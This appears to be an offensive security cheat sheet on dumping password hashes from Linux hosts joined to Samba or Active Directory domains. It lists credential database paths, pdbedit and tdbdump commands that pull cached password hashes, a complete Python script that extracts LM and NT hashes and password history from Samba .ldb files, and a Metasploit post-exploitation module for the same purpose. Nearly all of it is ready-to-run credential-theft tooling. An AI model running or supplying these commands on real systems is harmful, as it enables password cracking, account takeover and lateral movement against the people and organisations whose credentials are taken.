# Hashdump

```
 /var/lib/samba/private/secrets.tdb
 /var/lib/samba/passdb.tdb
 /var/opt/quest/vas/authcache/vas_auth.vdb
```

```
$ sudo apt install -y tdb-tools
```

```
# pdbedit -Lw

# pdbedit -Lw | column -t -s ":"

# tdbdump /var/lib/sss/db/cache_3RDPARTY.DOMAIN.TLD.ldb | grep cachedPassword | cut -f 2-4 -d "$" | cut -f 1 -
d "\\" | sed "s/^/$/g"

# grep -a "cachedPassword" /var/lib/sss/db/*.ldb
```

```python
#!/usr/bin/env python
# from http://files.securusglobal.com/samba-pwdump.py

def get_history(attr, r):
  hashes = []
  if attr in r:
    hist = r[attr][0]
    for i in range(0, len(hist), 16):
      h = hist[i:i+16].encode('hex')
      hashes.append(h)
  return hashes

def get_hash(attr, r):
  if attr not in r:
    return ''
  else:
    return r[attr][0].encode('hex')

from samba.ndr import ndr_unpack
from samba.dcerpc import security
from ldb import Ldb
from sys import argv, exit

if len(argv) not in (2, 3):
  print('Usage: %s <path to .ldb> [-history]' % argv[0])
  print(
    "Exmpl: %s '/var/lib/samba/private/sam.ldb.d/DC=SECURUS,DC=CORP,DC=COM.ldb'" % argv[0])
  exit(2)

for r in Ldb(argv[1]).search(expression='(objectclass=user)'):
  rid = ndr_unpack(security.dom_sid, r['objectSid'][0]).split()[-1]
  username = r['sAMAccountName']
  lmhash = get_hash('dBCSPwd', r)
  nthash = get_hash('unicodePwd', r)
  print('%s:%s:%s:%s:::' % (username, rid, lmhash, nthash))
  if len(argv) == 3 and argv[2] == '-history':
    lmhistory = get_history('lmPwdHistory', r)
    nthistory = get_history('ntPwdHistory', r)
    for i, (lmhash, nthash) in enumerate(map(lambda l, n: (l, n) if l else ('', n), lmhistory[1:], nthistory[1:])):
      print('%s_history%d:%s:%s:%s:::' %
         (username, i, rid, lmhash, nthash))
```

```
# samba-pwdump.py /var/lib/sss/db/cache_3RDPARTY.DOMAIN.TLD.ldb -history
```

```
msf > use post/multi/gather/unix_cached_ad_hashes

msf post(multi/gather/unix_cached_ad_hashes) > options 

Module options (post/multi/gather/unix_cached_ad_hashes):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(multi/gather/unix_cached_ad_hashes) > run session=<session_ID>
```